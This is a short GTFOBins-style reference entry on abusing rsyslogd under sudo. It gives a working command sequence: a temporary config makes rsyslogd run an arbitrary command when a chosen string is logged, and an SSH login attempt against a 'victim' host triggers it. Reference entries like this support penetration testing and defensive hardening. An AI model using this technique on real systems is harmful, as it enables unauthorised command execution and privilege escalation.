---
type: gtfobin
name: rsyslogd
platform: Unix
functions: [command]
tags: [gtfobin, unix, lotl]
---

# rsyslogd

## command

```bash
cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file
```
_In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:

```
ssh somerandomstring@victim.com
```_
**Contexts:** sudo
